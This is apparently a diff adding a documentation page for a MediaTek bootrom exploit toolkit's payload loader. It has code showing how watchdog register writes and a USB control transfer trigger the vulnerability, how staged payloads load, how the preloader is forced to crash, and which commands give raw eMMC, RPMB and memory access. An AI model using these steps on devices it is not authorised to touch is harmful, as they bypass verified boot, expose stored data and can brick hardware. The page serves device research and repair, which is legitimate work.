@@ -1,0 +1,343 @@
+---
+title: 'Payload Loader'
+description: 'Functions for loading and executing exploit payloads on MediaTek devices'
+---
+
+The payload loader module (`modules/load_payload.py`) provides high-level functions for loading multi-stage exploit payloads into MediaTek devices via the bootrom vulnerability.
+
+## Functions
+
+### load_payload(dev)
+
+Loads a two-stage bootrom exploit payload into the device.
+
+<ParamField path="dev" type="Device" required>
+  Initialized Device instance (must be in bootrom mode, not preloader)
+</ParamField>
+
+<ResponseField name="raises" type="RuntimeError">
+  If handshake fails, payload loading fails, or expected magic patterns aren't received
+</ResponseField>
+
+This is the primary exploit function that:
+1. Performs bootrom handshake
+2. Disables watchdog timer
+3. Waits for user to remove hardware short (if present)
+4. Manipulates watchdog registers to trigger vulnerability
+5. Sends USB control transfer to trigger payload execution
+6. Loads stage 1 payload via UART (stage1.bin)
+7. Loads stage 2 payload to SRAM (stage2.bin)
+8. Establishes full device control
+
+#### Stage 1 Exploit Flow
+
+```python
+# 1. Initial handshake
+dev.handshake()
+
+# 2. Disable watchdog
+dev.write32(0x10007000, 0x22000000)
+
+# 3. Wait for user input (remove short)
+# Keeps kicking watchdog while waiting
+
+# 4. Trigger vulnerability via watchdog registers
+dev.read32(0x10007050)
+dev.write32(0x10007050, [0xA1000])
+
+# 5. USB control transfer triggers code execution
+udev.ctrl_transfer(0xA1, 0, 0, 10, 0)
+
+# 6. Stage 1 payload confirms with magic 0xA1A2A3A4
+```
+
+#### Stage 2 Payload Loading
+
+```python
+# Load stage2.bin to 0x201000
+dev.write(p32(0xf00dd00d))  # Magic
+dev.write(p32(0x4000))      # CMD_LOAD_PAYLOAD
+dev.write(p32(0x201000))    # Target address
+dev.write(p32(len(stage2))) # Payload size
+dev.write(stage2)           # Payload data
+
+# Execute stage 2
+dev.write(p32(0xf00dd00d))  # Magic
+dev.write(p32(0x4001))      # CMD_EXEC_PAYLOAD
+dev.write(p32(0x201000))    # Execute address
+
+# Stage 2 confirms with magic 0xB1B2B3B4
+```
+
+#### Complete Example
+
+```python
+from modules.common import Device
+from modules.load_payload import load_payload
+from modules.logger import log
+
+# Connect to device
+dev = Device()
+dev.find_device()
+
+if dev.preloader:
+    log("ERROR: Device in preloader mode, use load_pl_payload instead")
+    exit(1)
+
+# Load full exploit
+log("Starting exploit...")
+load_payload(dev)
+log("Exploit successful, device ready for commands")
+
+# Device now accepts custom protocol commands
+# Can use emmc_read/write, rpmb_read/write, etc.
+```
+
+#### Payload Files Required
+
+<ParamField path="../brom-payload/stage1/stage1.bin" type="binary" required>
+  First stage payload (max 0xA00 bytes), runs in bootrom context
+</ParamField>
+
+<ParamField path="../brom-payload/stage2/stage2.bin" type="binary" required>
+  Second stage payload, loaded to SRAM at 0x201000, provides full device access
+</ParamField>
+
+#### Protocol Commands (After Stage 2)
+
+Once stage 2 is loaded, the device accepts these commands via the custom protocol (magic `0xF00DD00D` followed by command):
+
+| Command | Value | Description |
+|---------|-------|-------------|
+| EMMC_READ | 0x1000 | Read 512-byte block from eMMC |
+| EMMC_WRITE | 0x1001 | Write 512-byte block to eMMC |
+| EMMC_SWITCH | 0x1002 | Switch eMMC partition (0=User, 1=Boot0, 2=Boot1) |
+| RPMB_READ | 0x2000 | Read 256 bytes from RPMB |
+| RPMB_WRITE | 0x2001 | Write 256 bytes to RPMB |
+| REBOOT | 0x3000 | Reboot device |
+| KICK_WATCHDOG | 0x3001 | Reset watchdog timer |
+| LOAD_PAYLOAD | 0x4000 | Load additional payload to memory |
+| EXEC_PAYLOAD | 0x4001 | Execute payload at address |
+| MEM_READ | 0x5000 | Read arbitrary memory |
+| IDME_READ | 0x7000 | Read IDME field |
+
+---
+
+### load_pl_payload(dev)
+
+Loads a simplified payload when device is in preloader mode.
+
+<ParamField path="dev" type="Device" required>
+  Initialized Device instance (must be in preloader mode)
+</ParamField>
+
+<ResponseField name="raises" type="RuntimeError">
+  If handshake fails, DA send fails, or payload doesn't respond with magic pattern
+</ResponseField>
+
+This function:
+1. Performs bootrom handshake (works from preloader)
+2. Loads preloader-compatible payload (pl.bin) to 0x40001000
+3. Jumps to payload execution
+4. Waits for confirmation magic `0xB1B2B3B4`
+
+Preloader mode is detected automatically by `find_device()` when the USB PID is not `0003`.
+
+#### Example
+
+```python
+from modules.common import Device
+from modules.load_payload import load_pl_payload
+from modules.logger import log
+
+# Connect to device
+dev = Device()
+dev.find_device()
+
+if dev.preloader:
+    log("Device in preloader mode, loading PL payload")
+    load_pl_payload(dev)
+    log("PL payload loaded successfully")
+else:
+    log("Device in bootrom mode, use load_payload instead")
+```
+
+#### Payload File Required
+
+<ParamField path="../brom-payload/pl/pl.bin" type="binary" required>
+  Preloader-compatible payload binary
+</ParamField>
+
+#### Preloader Detection
+
+```python
+dev = Device()
+dev.find_device()
+
+if dev.preloader:
+    # PID != 0003, device booted to preloader
+    load_pl_payload(dev)
+else:
+    # PID == 0003, device in bootrom
+    load_payload(dev)
+```
+
+---
+
+### load_payload_file(path)
+
+Helper function to load a binary payload file and pad to 4-byte alignment.
+
+<ParamField path="path" type="str" required>
+  Path to payload binary file
+</ParamField>
+
+<ResponseField name="return" type="bytes">
+  Payload data, padded with null bytes to 4-byte boundary
+</ResponseField>
+
+This function:
+- Reads binary file
+- Logs payload size
+- Pads to 4-byte alignment with null bytes
+
+```python
+from modules.load_payload import load_payload_file
+
+# Load and auto-pad payload
+payload = load_payload_file("../brom-payload/stage1/stage1.bin")
+print(f"Loaded {len(payload)} bytes (padded)")
+
+# Verify alignment
+assert len(payload) % 4 == 0
+```
+
+---
+
+## Complete Workflow Example
+
+```python
+#!/usr/bin/env python3
+from modules.common import Device
+from modules.load_payload import load_payload, load_pl_payload
+from modules.logger import log
+import sys
+
+def main():
+    # Initialize device
+    dev = Device()
+    dev.find_device()
+    
+    # Check mode and load appropriate payload
+    if dev.preloader:
+        log("Device detected in preloader mode")
+        load_pl_payload(dev)
+    else:
+        log("Device detected in bootrom mode")
+        load_payload(dev)
+    
+    log("Payload loaded, device ready")
+    
+    # Now device accepts full protocol commands
+    # Read device information
+    device_type = dev.idme_read(b"device_type_id")
+    if device_type:
+        log(f"Device Type: {device_type.rstrip(b'\\x00').decode('utf-8')}")
+    
+    # Switch to user partition
+    dev.emmc_switch(0)
+    
+    # Read MBR
+    mbr = dev.emmc_read(0)
+    if mbr[510:512] == b"\\x55\\xAA":
+        log("Valid MBR signature found")
+    
+    # Check RPMB
+    rpmb = dev.rpmb_read()
+    log(f"RPMB header: {rpmb[0:4].hex()}")
+    
+    return dev
+
+if __name__ == "__main__":
+    try:
+        dev = main()
+        log("Success! Device is ready for operations.")
+    except RuntimeError as e:
+        log(f"ERROR: {e}")
+        sys.exit(1)
+```
+
+## Crashing Preloader to Bootrom
+
+Sometimes you need to force the device from preloader back to bootrom mode:
+
+```python
+from modules.common import Device
+from modules.logger import log
+
+dev = Device()
+dev.find_device()
+
+while dev.preloader:
+    log("Found device in preloader, attempting to crash...")
+    dev.handshake()
+    dev.crash_pl()  # Send malicious payload
+    dev.dev.close()
+    
+    # Re-detect (should now be in bootrom)
+    dev = Device()
+    dev.find_device()
+
+log("Device now in bootrom mode")
+load_payload(dev)
+```
+
+## Error Handling
+
+All payload loading functions can raise `RuntimeError` on failure:
+
+```python
+from modules.load_payload import load_payload
+from modules.logger import log
+import sys
+
+try:
+    load_payload(dev)
+except RuntimeError as e:
+    if "expected pattern" in str(e):
+        log("Payload failed to respond, device may have crashed")
+        log("Try power cycling and running again")
+    elif "payload too large" in str(e):
+        log("Stage 1 payload exceeds 0xA00 bytes")
+    else:
+        log(f"Unknown error: {e}")
+    
+    sys.exit(1)
+```
+
+## Security Considerations
+
+<Warning>
+These functions exploit vulnerabilities in MediaTek bootrom. They:
+- Execute unsigned code with full hardware access
+- Can brick devices if used incorrectly
+- Bypass verified boot and security features
+- Should only be used on devices you own for legitimate purposes
+</Warning>
+
+## Dependencies
+
+The payload loader requires:
+
+```python
+import usb.core  # PyUSB for USB control transfers
+import usb.util
+import struct    # Binary data packing
+import time      # Delays and timing
+import threading # User input handling
+```
+
+Install with:
+```bash
+pip install pyusb pyserial
+```
